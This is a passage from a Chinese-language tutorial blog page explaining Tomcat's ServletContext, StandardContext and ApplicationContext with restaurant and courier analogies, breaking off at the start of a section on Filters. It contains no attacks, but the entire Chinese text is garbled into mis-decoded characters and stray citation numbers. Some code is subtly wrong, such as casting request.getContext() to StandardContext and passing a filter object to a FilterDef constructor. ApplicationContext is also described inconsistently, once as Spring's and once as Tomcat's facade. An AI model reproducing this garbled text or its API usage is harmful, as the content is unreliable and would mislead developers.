id="Java-ä¸­çš„-ServletContext-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#Java-ä¸­çš„-ServletContext-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="Java ä¸­çš„ ServletContext æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>Java ä¸­çš„ ServletContext æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h3><p><strong>ServletContext å°±æ˜¯æ•´ä¸ª Web åº”ç”¨çš„â€œå‰§ç»„æ¡£æ¡ˆåº“â€</strong>ï¼Œå®ƒä¿å­˜ç€è¿™ä¸ª Web åº”ç”¨çš„æ‰€æœ‰â€œæ‹æ‘„ä¿¡æ¯â€(å¤§æ¦‚å°±æ˜¯è§„å®šäº†å¦‚æœè¦å®ç°ä¸€ä¸ªWEBå®¹å™¨ï¼Œä»–çš„Contexté‡Œé¢è¦æœ‰è¿™äº›ä¸œè¥¿ï¼šè·å–è·¯å¾„ï¼Œè·å–å‚æ•°ï¼Œè·å–å½“å‰çš„filterï¼Œè·å–å½“å‰çš„servletç­‰)ï¼š</p><p><strong>å…¨å±€é“å…·æ¸…å•</strong>ï¼ˆå…¨å±€å‚æ•°ï¼‰</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å­˜ï¼šsetAttribute(&quot;é“å…·å&quot;, é“å…·)</span></span><br><span class="line">context.setAttribute(<span class="string">&quot;database_url&quot;</span>, <span class="string">&quot;jdbc:mysql://localhost:3306/mydb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å–ï¼šgetAttribute(&quot;é“å…·å&quot;)</span></span><br><span class="line"><span class="type">String</span> <span class="variable">dbUrl</span> <span class="operator">=</span> (String) context.getAttribute(<span class="string">&quot;database_url&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>æ¼”å‘˜åå•</strong>ï¼ˆServlet&#x2F;Filter&#x2F;Listener é…ç½®ï¼‰</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŠ¨æ€æ·»åŠ ä¸€ä¸ªâ€œç¾¤æ¼”â€ï¼ˆServletï¼‰</span></span><br><span class="line">ServletRegistration.<span class="type">Dynamic</span> <span class="variable">servlet</span> <span class="operator">=</span> context.addServlet(<span class="string">&quot;MyServlet&quot;</span>, MyServlet.class);</span><br><span class="line">servlet.addMapping(<span class="string">&quot;/my-url&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>æ‹æ‘„åœºåœ°åœ°å›¾</strong>ï¼ˆèµ„æºè·¯å¾„ï¼‰</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è·å–æ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šçš„çœŸå®è·¯å¾„ï¼ˆæ¯”å¦‚æ‰¾å‰§æœ¬æ–‡ä»¶ï¼‰</span></span><br><span class="line"><span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> context.getRealPath(<span class="string">&quot;/WEB-INF/config.xml&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><hr><h3 id="StandardContext-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#StandardContext-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="StandardContext æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>StandardContext æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h3><p><strong>StandardContext å°±æ˜¯ Tomcat çš„ã€ŒåŒ…è£¹å¤„ç†ä¸­æ¢ã€</strong>ï¼Œå®ƒè´Ÿè´£ï¼š</p><ol><li><strong>ç®¡ç†æ‰€æœ‰å¿«é€’å‘˜ï¼ˆServlet&#x2F;Filter&#x2F;Listenerï¼‰</strong>ï¼šè®°å½•æ¯ä¸ªå¿«é€’å‘˜è´Ÿè´£çš„åŒºåŸŸï¼ˆURL è·¯å¾„ï¼‰å’Œæ“ä½œè§„èŒƒï¼ˆé…ç½®ï¼‰</li><li><strong>ç›‘æ§åŒ…è£¹ï¼ˆè¯·æ±‚ï¼‰æµè½¬</strong>ï¼šä»å¿«é€’è½¦ï¼ˆHTTP è¯·æ±‚ï¼‰åˆ°è¾¾åˆ†æ‹£ä¸­å¿ƒå¼€å§‹ï¼Œåˆ°åŒ…è£¹æ´¾é€å®Œæˆï¼ˆå“åº”è¿”å›ï¼‰çš„å…¨æµç¨‹</li><li><strong>å¤„ç†çªå‘äº‹ä»¶</strong>ï¼šæ¯”å¦‚åŒ…è£¹ç ´æŸï¼ˆè¯·æ±‚é”™è¯¯ï¼‰ã€è¶…é‡ï¼ˆè¯·æ±‚æ•°æ®è¿‡å¤§ï¼‰ç­‰æƒ…å†µ</li></ol><hr><h3 id="å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ"><a href="#å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ" class="headerlink" title="å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ"></a><strong>å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ</strong></h3><ol><li><p><strong>åŒ…è£¹ç™»è®°å¤„</strong></p><ul><li><p>æ¯ä¸ªæ–°åˆ°çš„å¿«é€’ï¼ˆWeb åº”ç”¨ï¼‰éƒ½è¦åœ¨è¿™é‡Œæ³¨å†Œä¿¡æ¯ï¼Œæ¯”å¦‚ï¼š</p><ul><li><p>ğŸ“¦ åŒ…è£¹ç±»å‹ï¼šæ˜¯æ–‡ä»¶ï¼ˆé™æ€èµ„æºï¼‰è¿˜æ˜¯ç”Ÿé²œï¼ˆåŠ¨æ€è¯·æ±‚ï¼‰ï¼Ÿ</p><p><strong>2</strong></p></li><li><p>ğŸ“¦ æ´¾é€è§„åˆ™ï¼šå“ªäº›å¿«é€’å‘˜ï¼ˆServletï¼‰å¤„ç†å“ªäº›åŒºåŸŸçš„åŒ…è£¹ï¼Ÿ</p><p><strong>2</strong></p></li></ul></li></ul></li><li><p><strong>å¿«é€’å‘˜è°ƒåº¦ä¸­å¿ƒ</strong></p><ul><li><p>ç®¡ç†ä¸‰å¤§ç±»å·¥ä½œäººå‘˜ï¼š</p><ul><li><p>ğŸšš </p><p>å¸è´§ç»„ï¼ˆListenerï¼‰</p><p>ï¼šåŒ…è£¹åˆšåˆ°åˆ†æ‹£ä¸­å¿ƒæ—¶æ£€æŸ¥å¤–åŒ…è£…ï¼ˆè¯·æ±‚åˆå§‹åŒ–ï¼‰</p><hr></li><li><p>ğŸ” <strong>åˆ†æ‹£ç»„ï¼ˆFilterï¼‰</strong>ï¼šç»™åŒ…è£¹è´´æ ‡ç­¾ã€æ¶ˆæ¯’ï¼ˆå‚æ•°å¤„ç†&#x2F;å®‰å…¨æ£€æŸ¥ï¼‰</p></li><li><p>ğŸš› <strong>æ´¾é€ç»„ï¼ˆServletï¼‰</strong>ï¼šæŠŠåŒ…è£¹é€åˆ°æ­£ç¡®åœ°å€ï¼ˆç”Ÿæˆå“åº”ï¼‰</p></li></ul></li></ul></li><li><p><strong>å¼‚å¸¸å¤„ç†æœºåˆ¶</strong></p><ul><li><p>å¦‚æœå‘ç°å±é™©å“ï¼ˆæ¶æ„è¯·æ±‚ï¼‰ï¼Œä¼šå¯åŠ¨ï¼š</p><ul><li><p>ğŸ”’ è‡ªåŠ¨æ‹¦æˆªï¼ˆè¿”å› 403 é”™è¯¯ï¼‰</p></li><li><p>ğŸ“¢ è§¦å‘è­¦æŠ¥ï¼ˆè®°å½•æ—¥å¿—&#x2F;é€šçŸ¥ç®¡ç†å‘˜ï¼‰</p><hr></li></ul></li></ul></li></ol><hr><h3 id="å’Œ-ApplicationContext-çš„åŒºåˆ«-6"><a href="#å’Œ-ApplicationContext-çš„åŒºåˆ«-6" class="headerlink" title="å’Œ ApplicationContext çš„åŒºåˆ«****6"></a><strong>å’Œ ApplicationContext çš„åŒºåˆ«****6</strong></h3><table><thead><tr><th align="center"></th><th align="center">StandardContextï¼ˆå¿«é€’åˆ†æ‹£ä¸­å¿ƒï¼‰</th><th align="center">ApplicationContextï¼ˆæ™ºèƒ½ä¸­å¤®å¨æˆ¿ï¼‰</th></tr></thead><tbody><tr><td align="center"><strong>æ‰€å±ç³»ç»Ÿ</strong></td><td align="center">Tomcat ä¸“å±</td><td align="center">Spring æ¡†æ¶ä¸“å±</td></tr><tr><td align="center"><strong>ä¸»è¦åŠŸèƒ½</strong></td><td align="center">ç®¡ç† Web åº”ç”¨çš„è¯·æ±‚å¤„ç†æµç¨‹</td><td align="center">ç®¡ç† Spring Bean å’Œä¾èµ–æ³¨å…¥</td></tr><tr><td align="center"><strong>æ•°æ®å­˜å‚¨</strong></td><td align="center">å­˜ Servlet&#x2F;Filter é…ç½®</td><td align="center">å­˜ä¸šåŠ¡å¯¹è±¡å’Œç»„ä»¶å…³ç³»</td></tr><tr><td align="center"><strong>å…¸å‹æ“ä½œ</strong></td><td align="center">æ·»åŠ ç›‘å¬å™¨ã€é…ç½®é”™è¯¯é¡µé¢</td><td align="center">åŠ è½½é…ç½®æ–‡ä»¶ã€ç®¡ç†äº‹åŠ¡</td></tr></tbody></table><hr><h3 id="å®é™…å¼€å‘ä¸­çš„å­˜åœ¨æ„Ÿ"><a href="#å®é™…å¼€å‘ä¸­çš„å­˜åœ¨æ„Ÿ" class="headerlink" title="å®é™…å¼€å‘ä¸­çš„å­˜åœ¨æ„Ÿ"></a><strong>å®é™…å¼€å‘ä¸­çš„å­˜åœ¨æ„Ÿ</strong></h3><p>å½“ä½ åœ¨ Tomcat çš„ <code>conf/server.xml</code> é‡Œå†™è¿™æ ·çš„é…ç½®æ—¶ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span> <span class="attr">path</span>=<span class="string">&quot;/shop&quot;</span> <span class="attr">docBase</span>=<span class="string">&quot;D:\myapp&quot;</span> <span class="attr">reloadable</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>èƒŒåçš„ <strong>StandardContext</strong> å°±ä¼šï¼š</p><ol><li>ğŸ“‚ æŠŠ <code>D:\myapp</code> æ–‡ä»¶å¤¹è¯†åˆ«ä¸ºã€Œshop ä¸“åŒºã€</li><li>ğŸ”„ å¼€å¯è‡ªåŠ¨ç›‘æ§ï¼ˆreloadableï¼‰ï¼Œæ–‡ä»¶æ”¹åŠ¨æ—¶è‡ªåŠ¨åˆ·æ–°</li><li>ğŸ›¡ï¸ ç»™è¿™ä¸ªä¸“åŒºåˆ†é…ç‹¬ç«‹çš„å®‰å…¨ç­–ç•¥ï¼ˆæ¯”å¦‚å•ç‹¬çš„ç™»å½•éªŒè¯ï¼‰</li></ol><hr><h3 id="ä¸€å¥è¯æ€»ç»“"><a href="#ä¸€å¥è¯æ€»ç»“" class="headerlink" title="ä¸€å¥è¯æ€»ç»“"></a><strong>ä¸€å¥è¯æ€»ç»“</strong></h3><p><strong>StandardContext å°±æ˜¯ Tomcat çš„ã€Œåˆ†æ‹£ä¸­å¿ƒä¸»ç®¡ã€</strong>ï¼Œå®ƒçŸ¥é“ï¼š</p><ul><li>æ¯ä¸ªåŒ…è£¹ï¼ˆè¯·æ±‚ï¼‰è¯¥èµ°å“ªæ¡æµæ°´çº¿ ğŸšš</li><li>æ‰€æœ‰å·¥ä½œäººå‘˜ï¼ˆServlet&#x2F;Filterï¼‰çš„æ’ç­è¡¨ ğŸ“…</li><li>é‡åˆ°çªå‘çŠ¶å†µæ—¶è¯¥å¯åŠ¨å“ªå¥—åº”æ€¥é¢„æ¡ˆ ğŸš¨</li></ul><p>æ²¡æœ‰å®ƒï¼ŒTomcat å°±åƒæ²¡æœ‰è°ƒåº¦ç³»ç»Ÿçš„å¿«é€’ç«™ï¼ŒåŒ…è£¹ä¼šä¹±æˆä¸€é”…ç²¥ï¼</p><h3 id="ä¸€ã€ä¸‰ç§-Context-çš„å…³ç³»ä¸è§’è‰²"><a href="#ä¸€ã€ä¸‰ç§-Context-çš„å…³ç³»ä¸è§’è‰²" class="headerlink" title="ä¸€ã€ä¸‰ç§ Context çš„å…³ç³»ä¸è§’è‰²"></a><strong>ä¸€ã€ä¸‰ç§ Context çš„å…³ç³»ä¸è§’è‰²</strong></h3><table><thead><tr><th align="center"></th><th align="center"><strong>ServletContext</strong></th><th align="center"><strong>ApplicationContext</strong></th><th align="center"><strong>StandardContext</strong></th></tr></thead><tbody><tr><td align="center"><strong>èº«ä»½å®šä½</strong></td><td align="center">å®˜æ–¹èœå•ï¼ˆè§„èŒƒï¼‰<strong>3</strong></td><td align="center">å‰å°æ¥å¾…ï¼ˆé—¨é¢ï¼‰<strong>2****3</strong></td><td align="center">åå¨ä¸»ç®¡ï¼ˆå®é™…å¹²æ´»ï¼‰<strong>2****6</strong></td></tr><tr><td align="center"><strong>èŒè´£</strong></td><td align="center">è§„å®šé¤å…è¦æœ‰å“ªäº›åŠŸèƒ½ï¼ˆæ¥å£ï¼‰</td><td align="center">å¯¹å¤–éšè—åå¨ç»†èŠ‚ï¼Œåªå±•ç¤ºè§„èŒƒåŠŸèƒ½</td><td align="center">å®é™…å®‰æ’å¨å¸ˆã€å¤‡èœã€å¤„ç†è®¢å•</td></tr><tr><td align="center"><strong>å­˜åœ¨æ„Ÿ</strong></td><td align="center">é¡¾å®¢çœ‹ä¸è§ï¼Œä½†æ‰€æœ‰èœå“éƒ½æŒ‰å®ƒåˆ¶ä½œ</td><td align="center">æœåŠ¡å‘˜æ‹¿èœå•ç»™é¡¾å®¢çœ‹</td><td align="center">åœ¨å¨æˆ¿é‡Œå¼ç€è°ƒåº¦äººå‘˜</td></tr></tbody></table><hr><h3 id="äºŒã€å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ"><a href="#äºŒã€å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ" class="headerlink" title="äºŒã€å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ"></a><strong>äºŒã€å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ</strong></h3><h4 id="1-ServletContext-â€”â€”-å®˜æ–¹ã€Šé¤é¥®ä¸šæ ‡å‡†èœå•ã€‹"><a href="#1-ServletContext-â€”â€”-å®˜æ–¹ã€Šé¤é¥®ä¸šæ ‡å‡†èœå•ã€‹" class="headerlink" title="1. ServletContext â€”â€” å®˜æ–¹ã€Šé¤é¥®ä¸šæ ‡å‡†èœå•ã€‹"></a><strong>1. ServletContext â€”â€” å®˜æ–¹ã€Šé¤é¥®ä¸šæ ‡å‡†èœå•ã€‹</strong></h4><p>- </p><p>  ä½œç”¨</p><p>  ï¼šå›½å®¶è§„å®šæ‰€æœ‰é¤å…å¿…é¡»æ”¯æŒçš„åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼š</p><ul><li><p>ğŸ“œ <strong>å¿…é¡»èƒ½æŸ¥èœå“ä»·æ ¼</strong> â†’ <code>getInitParameter(&quot;æŠ˜æ‰£&quot;)</code></p></li><li><p>ğŸ“œ <strong>å¿…é¡»æœ‰æœåŠ¡å‘˜åå•</strong> â†’ <code>getServletRegistrations()</code></p></li><li><p>ğŸ“œ <strong>å¿…é¡»èƒ½è®°å½•å®¢æµé‡</strong> â†’ <code>setAttribute(&quot;ä»Šæ—¥å®¢æµ&quot;, 1000)</code></p></li><li><p>ç‰¹ç‚¹</p><p>ï¼š</p><ul><li><p>æ‰€æœ‰é¤å…ï¼ˆWeb åº”ç”¨ï¼‰éƒ½å¿…é¡»éµå®ˆè¿™å¥—è§„èŒƒ</p><p><strong>3</strong></p></li><li><p>é¡¾å®¢ï¼ˆå¼€å‘è€…ï¼‰çœ‹ä¸åˆ°å®ƒï¼Œä½†èœå•ï¼ˆåŠŸèƒ½ï¼‰éƒ½æ˜¯å®ƒè§„å®šçš„</p></li></ul></li></ul><h4 id="2-ApplicationContext-â€”â€”-é¤å…å‰å°æœåŠ¡å‘˜"><a href="#2-ApplicationContext-â€”â€”-é¤å…å‰å°æœåŠ¡å‘˜" class="headerlink" title="2. ApplicationContext â€”â€” é¤å…å‰å°æœåŠ¡å‘˜"></a><strong>2. ApplicationContext â€”â€” é¤å…å‰å°æœåŠ¡å‘˜</strong></h4><p>- </p><p>  ä½œç”¨</p><p>  ï¼šæŠŠå¤æ‚çš„åå¨æ“ä½œåŒ…è£…æˆç®€å•æŒ‡ä»¤ï¼Œæ¯”å¦‚ï¼š</p><ul><li><p>ğŸ§‘ğŸ³ <strong>åŠ æ–°èœ</strong> â†’ <code>addServlet(&quot;éº»è¾£é¦™é”…&quot;, SpicyPot.class)</code></p></li><li><p>ğŸ§¹ <strong>æ¢é¤å…·</strong> â†’ <code>addFilter(&quot;æ¶ˆæ¯’è¿‡æ»¤å™¨&quot;, DisinfectionFilter.class)</code></p></li><li><p>ç‰¹ç‚¹</p><p>ï¼š</p><ul><li><p>å¯¹é¡¾å®¢ï¼ˆå¼€å‘è€…ï¼‰éšè—äº†åå¨åˆ‡èœã€ç‚’èœçš„è¿‡ç¨‹ï¼ˆåº•å±‚ StandardContext çš„å¤æ‚æ“ä½œï¼‰</p><p><strong>2</strong></p></li><li><p>æœ¬è´¨æ˜¯ StandardContext çš„â€œé©¬ç”²â€ï¼ˆé—¨é¢æ¨¡å¼ï¼‰</p><p><strong>3</strong></p></li></ul></li></ul><h4 id="3-StandardContext-â€”â€”-æš´èºåå¨ä¸»ç®¡"><a href="#3-StandardContext-â€”â€”-æš´èºåå¨ä¸»ç®¡" class="headerlink" title="3. StandardContext â€”â€” æš´èºåå¨ä¸»ç®¡"></a><strong>3. StandardContext â€”â€” æš´èºåå¨ä¸»ç®¡</strong></h4><p>- </p><p>  å®é™…å¹²æ´»</p><p>  ï¼š</p><ul><li><p>ğŸ“Œ <strong>ç®¡ç†æ‰€æœ‰å¨å¸ˆ</strong>ï¼ˆServlet&#x2F;Filter&#x2F;Listenerï¼‰çš„æ’ç­è¡¨</p></li><li><p>ğŸ“Œ </p><p>ç›‘æ§è®¢å•æµç¨‹</p><p>ï¼šä»æ¥å•åˆ°ä¸Šèœçš„æ¯ä¸ªç¯èŠ‚ï¼ˆPipeline-Valve è´£ä»»é“¾ï¼‰</p><p><strong>6</strong></p></li><li><p>ğŸ“Œ <strong>å¤„ç†çªå‘çŠ¶å†µ</strong>ï¼šæ¯”å¦‚é£Ÿæä¸è¶³ï¼ˆè¯·æ±‚é”™è¯¯ï¼‰æ—¶å¯åŠ¨å¤‡ç”¨æ–¹æ¡ˆ</p></li><li><p>é…ç½®æ–¹å¼</p><p>ï¼ˆä¸‰ç§åå¨ç®¡ç†æ¨¡å¼ï¼‰ï¼š</p><ul><li><p>ğŸ“‚ </p><p>é»˜è®¤æ¨¡å¼</p><p>ï¼šæŠŠèœè°±ï¼ˆWAR åŒ…ï¼‰ä¸¢è¿›å›ºå®šæŸœå­ï¼ˆwebapps ç›®å½•ï¼‰ï¼Œè‡ªåŠ¨è¯†åˆ«</p><p><strong>4</strong></p></li><li><p>ğŸ“ </p><p>æ‰‹å†™æ¨¡å¼</p><p>ï¼šåœ¨æ€»è´¦æœ¬ï¼ˆserver.xmlï¼‰é‡Œå†™æ­»èœå•ï¼Œé‡å¯ç”Ÿæ•ˆ</p><p><strong>4</strong></p></li><li><p>ğŸ—’ï¸ </p><p>ä¾¿åˆ©è´´æ¨¡å¼</p><p>ï¼šåœ¨å¨æˆ¿å¢™ä¸Šè´´ä¾¿åˆ©è´´ï¼ˆconf&#x2F;Catalina ç›®å½•ä¸‹çš„ XMLï¼‰ï¼Œéšæ—¶ä¿®æ”¹</p><p><strong>4</strong></p><p><strong>6</strong></p></li></ul></li></ul><hr><h3 id="ä¸‰ã€å®é™…å¼€å‘ä¸­çš„ç»å…¸åœºæ™¯"><a href="#ä¸‰ã€å®é™…å¼€å‘ä¸­çš„ç»å…¸åœºæ™¯" class="headerlink" title="ä¸‰ã€å®é™…å¼€å‘ä¸­çš„ç»å…¸åœºæ™¯"></a><strong>ä¸‰ã€å®é™…å¼€å‘ä¸­çš„ç»å…¸åœºæ™¯</strong></h3><h4 id="åœºæ™¯-1ï¼šç»Ÿè®¡å…¨ç«™è®¿é—®é‡"><a href="#åœºæ™¯-1ï¼šç»Ÿè®¡å…¨ç«™è®¿é—®é‡" class="headerlink" title="åœºæ™¯ 1ï¼šç»Ÿè®¡å…¨ç«™è®¿é—®é‡"></a><strong>åœºæ™¯ 1ï¼šç»Ÿè®¡å…¨ç«™è®¿é—®é‡</strong></h4><p>java</p><p>å¤åˆ¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ç”¨ ServletContext å­˜å…¨å±€è®¡æ•°</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> getServletContext();</span><br><span class="line">context.setAttribute(<span class="string">&quot;visit_count&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¯æ¬¡è®¿é—®æ—¶ +1</span></span><br><span class="line"><span class="keyword">synchronized</span>(context) &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> (<span class="type">int</span>) context.getAttribute(<span class="string">&quot;visit_count&quot;</span>);</span><br><span class="line">    context.setAttribute(<span class="string">&quot;visit_count&quot;</span>, count + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åœºæ™¯-2ï¼šåŠ¨æ€æ·»åŠ æ¥å£"><a href="#åœºæ™¯-2ï¼šåŠ¨æ€æ·»åŠ æ¥å£" class="headerlink" title="åœºæ™¯ 2ï¼šåŠ¨æ€æ·»åŠ æ¥å£"></a><strong>åœºæ™¯ 2ï¼šåŠ¨æ€æ·»åŠ æ¥å£</strong></h4><p>java</p><p>å¤åˆ¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€šè¿‡ ApplicationContext åŠ æ–°åŠŸèƒ½</span></span><br><span class="line">ServletRegistration.<span class="type">Dynamic</span> <span class="variable">servlet</span> <span class="operator">=</span> context.addServlet(<span class="string">&quot;ApiServlet&quot;</span>, ApiServlet.class);</span><br><span class="line">servlet.addMapping(<span class="string">&quot;/api/*&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="åœºæ™¯-3ï¼šç´§æ€¥å°ç¦-IP"><a href="#åœºæ™¯-3ï¼šç´§æ€¥å°ç¦-IP" class="headerlink" title="åœºæ™¯ 3ï¼šç´§æ€¥å°ç¦ IP"></a><strong>åœºæ™¯ 3ï¼šç´§æ€¥å°ç¦ IP</strong></h4><p>java</p><p>å¤åˆ¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ“ä½œ StandardContext åŠ é»‘åå•è¿‡æ»¤å™¨</span></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">stdContext</span> <span class="operator">=</span> (StandardContext) request.getContext(); <span class="comment">// è·å–åå¨ä¸»ç®¡</span></span><br><span class="line">stdContext.addFilter(<span class="keyword">new</span> <span class="title class_">FilterDef</span>(<span class="keyword">new</span> <span class="title class_">IpBlockFilter</span>())); <span class="comment">// å¡ä¸ªè¿‡æ»¤å™¨ç»™ä»–</span></span><br></pre></td></tr></table></figure><hr><h3 id="å››ã€ä¸€å¥è¯æ€»ç»“"><a href="#å››ã€ä¸€å¥è¯æ€»ç»“" class="headerlink" title="å››ã€ä¸€å¥è¯æ€»ç»“"></a><strong>å››ã€ä¸€å¥è¯æ€»ç»“</strong></h3><ul><li><strong>ServletContext</strong> æ˜¯è¡Œä¸šæ ‡å‡†ï¼ˆèœå•å¿…é¡»æœ‰å“ªäº›èœï¼‰</li><li><strong>ApplicationContext</strong> æ˜¯æœåŠ¡å‘˜ï¼ˆæŒ‰æ ‡å‡†ç»™é¡¾å®¢ç‚¹èœï¼‰</li><li><strong>StandardContext</strong> æ˜¯åå¨ï¼ˆå®é™…ç‚’èœã€å¤„ç†è®¢å•ï¼‰</li></ul><p>ä¸‰è€…å°±åƒé¤å…çš„ <strong>ã€Œæ ‡å‡† â†’ æ¥å£ â†’ å®ç°ã€</strong>ï¼Œå…±åŒä¿è¯ Tomcat èƒ½é«˜æ•ˆå¤„ç†æ¯ä¸ªè¯·æ±‚ï¼</p><h1 id="TomCatä¸Servletçš„å…³ç³»"><a href="#TomCatä¸Servletçš„å…³ç³»" class="headerlink" title="TomCatä¸Servletçš„å…³ç³»"></a>TomCatä¸Servletçš„å…³ç³»</h1><p><a href="https://blog.csdn.net/weixin_46225503/article/details/135307399">https://blog.csdn.net/weixin_46225503/article/details/135307399</a></p><p><strong>æƒ³è±¡ä¸€ä¸ªé¤å…ï¼š</strong></p><ul><li><strong>Tomcat</strong> å°±åƒé¤å…çš„å‰å°å’Œä¼ èœå‘˜ã€‚å®ƒè´Ÿè´£æ¥å¾…å®¢äººï¼ˆæ¥æ”¶æµè§ˆå™¨å‘æ¥çš„è¯·æ±‚ï¼‰ï¼Œå®‰æ’åº§ä½ï¼ˆç®¡ç†ç½‘ç»œè¿æ¥ï¼‰ï¼Œç„¶åæŠŠå®¢äººç‚¹çš„èœå•äº¤ç»™åå¨ï¼ˆServletï¼‰ï¼Œæœ€åæŠŠåšå¥½çš„èœç«¯å›ç»™å®¢äººï¼ˆæŠŠå¤„ç†ç»“æœè¿”å›ç»™æµè§ˆå™¨ï¼‰ã€‚</li><li><strong>Servlet</strong> å°±åƒåå¨çš„å¨å¸ˆã€‚å®ƒä¸ç›´æ¥å’Œå®¢äººæ‰“äº¤é“ï¼Œä½†æ‹¿åˆ°èœå•ï¼ˆHTTPè¯·æ±‚ï¼‰åï¼Œè´Ÿè´£æŒ‰éœ€æ±‚ç‚’èœï¼ˆå¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œæ¯”å¦‚ç™»å½•ã€æŸ¥è¯¢æ•°æ®ï¼‰ï¼Œç„¶åæŠŠç‚’å¥½çš„èœï¼ˆç”Ÿæˆçš„HTMLé¡µé¢æˆ–æ•°æ®ï¼‰äº¤ç»™ä¼ èœå‘˜ï¼ˆTomcatï¼‰ã€‚</li></ul><hr><p><strong>å…·ä½“å…³ç³»ï¼š</strong></p><ol><li><strong>Tomcat æ˜¯ Servlet çš„â€œè¿è¡Œç¯å¢ƒâ€</strong><br>å°±åƒæ‰‹æœºéœ€è¦å®‰å“&#x2F;iOSç³»ç»Ÿæ‰èƒ½è¿è¡ŒAPPä¸€æ ·ï¼ŒServlet å¿…é¡»æ”¾åœ¨ Tomcat è¿™ç±»â€œå®¹å™¨â€é‡Œæ‰èƒ½å·¥ä½œã€‚Tomcat è´Ÿè´£ç®¡ç† Servlet çš„åˆ›å»ºã€è°ƒç”¨å’Œé”€æ¯ã€‚</li><li><strong>åˆ†å·¥æ˜ç¡®</strong><ul><li><strong>Tomcat å¹²ç²—æ´»</strong>ï¼šå¤„ç†ç½‘ç»œé€šä¿¡ï¼ˆç›‘å¬ç«¯å£ã€è§£æHTTPåè®®ï¼‰ã€å¤šçº¿ç¨‹ç®¡ç†ã€å®‰å…¨æ€§ç­‰åº•å±‚ç»†èŠ‚ã€‚</li><li><strong>Servlet å¹²ç»†æ´»</strong>ï¼šä¸“æ³¨å†™ä¸šåŠ¡é€»è¾‘ï¼ˆæ¯”å¦‚ç”¨æˆ·æ³¨å†Œã€æ•°æ®æŸ¥è¯¢ï¼‰ï¼Œä¸ç”¨ç®¡ç½‘ç»œæ€ä¹ˆä¼ æ•°æ®ã€‚</li></ul></li><li><strong>åä½œæµç¨‹</strong><br>å½“ä½ åœ¨æµè§ˆå™¨è¾“å…¥ç½‘å€æ—¶ï¼š<ul><li>Tomcat å…ˆæ¥æ”¶åˆ°è¯·æ±‚ï¼Œåˆ†æè¦æ‰¾å“ªä¸ª Servletï¼ˆæ¯”å¦‚å¤„ç†ç™»å½•çš„ LoginServletï¼‰ã€‚</li><li>Tomcat è°ƒç”¨å¯¹åº”çš„ Servletï¼ŒæŠŠè¯·æ±‚ä¿¡æ¯ï¼ˆå‚æ•°ã€è¯·æ±‚å¤´ç­‰ï¼‰ä¼ ç»™å®ƒã€‚</li><li>Servlet å¤„ç†å®Œï¼ŒæŠŠç»“æœï¼ˆæ¯”å¦‚ç”Ÿæˆçš„HTMLé¡µé¢ï¼‰äº¤ç»™ Tomcatã€‚</li><li>Tomcat æŠŠç»“æœåŒ…è£…æˆHTTPå“åº”ï¼Œå‘å›ç»™æµè§ˆå™¨ã€‚</li></ul></li></ol><hr><p><strong>ä¸€å¥è¯æ€»ç»“ï¼š</strong><br>Tomcat æ˜¯ Servlet çš„â€œæœåŠ¡å‘˜+ç®¡å®¶â€ï¼ŒServlet æ˜¯ Tomcat çš„â€œæ‰“å·¥äººâ€ã€‚æ²¡æœ‰ Tomcatï¼ŒServlet æ— æ³•ç‹¬ç«‹å·¥ä½œï¼›æ²¡æœ‰ Servletï¼ŒTomcat åªæ˜¯ä¸ªç©ºå£³ã€‚</p><h1 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h1><p>Filterï¼ˆè¿‡æ»¤å™¨ï¼‰å°±åƒæ˜¯ä½ åœ¨ç½‘ä¸Šç‚¹å¤–å–æ—¶å€™çš„â€ä¸­é—´å•†â€ã€‚æ¯”å¦‚ä½ ä¸‹å•åï¼Œå¤–å–å°å“¥é€é¤å‰ä¼šå…ˆæ£€æŸ¥ä½ çš„è®¢å•æ˜¯å¦æ­£å¸¸ï¼Œæœ‰æ²¡æœ‰è¿ç¦å“ï¼Œæˆ–è€…ç»™ä½ çš„é¤ç›’åŠ 